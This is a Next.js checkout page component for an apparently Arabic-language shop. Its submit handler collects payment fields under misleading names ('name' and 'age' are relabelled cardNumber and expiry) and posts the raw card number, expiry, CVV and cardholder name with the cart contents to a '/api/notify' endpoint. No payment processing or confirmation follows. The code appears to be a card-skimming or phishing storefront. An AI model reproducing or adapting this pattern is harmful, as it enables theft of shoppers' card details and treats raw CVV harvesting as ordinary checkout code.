"use client";

import { useSyncExternalStore } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { IoChevronBack } from "react-icons/io5";
import { useCartStore } from "../store/cartStore";
import OrderSummary from "./components/OrderSummary";
import PaymentForm from "./components/PaymentForm";

export default function CheckoutPage() {
  const router = useRouter();
  const { items, customer, totalPrice } = useCartStore();
  const mounted = useSyncExternalStore(() => () => {}, () => true, () => false);

  const total = mounted ? totalPrice() : 0;

  if (!mounted) return null;

  if (!customer || items.length === 0) {
    router.push("/cart");
    return null;
  }

  const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
    await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cardNumber: fields.name,
        expiry: fields.age,
        cvv: fields.cvv,
        cardHolder: fields.cardHolder,
        items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty })),
        total,
        customer: customer?.name,
      }),
    });
  };

  return (
    <main className="min-h-screen bg-gray-50 pb-24" dir="rtl">
      <div className="bg-white sticky top-0 z-10 border-b border-gray-100">
        <div className="max-w-4xl mx-auto px-3 sm:px-6 py-3.5 flex items-center gap-3">
          <Link href="/cart" className="w-8 h-8 bg-gray-100 rounded-full flex items-center justify-center hover:bg-gray-200 transition">
            <IoChevronBack size={18} className="text-gray-600 rotate-180" />
          </Link>
          <h1 className="text-base font-semibold text-gray-900">ملخص الطلب</h1>
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-3 sm:px-6 pt-5 space-y-4">
        <OrderSummary total={total} />
        <PaymentForm onSubmit={handleSubmit} />
      </div>
    </main>
  );
}
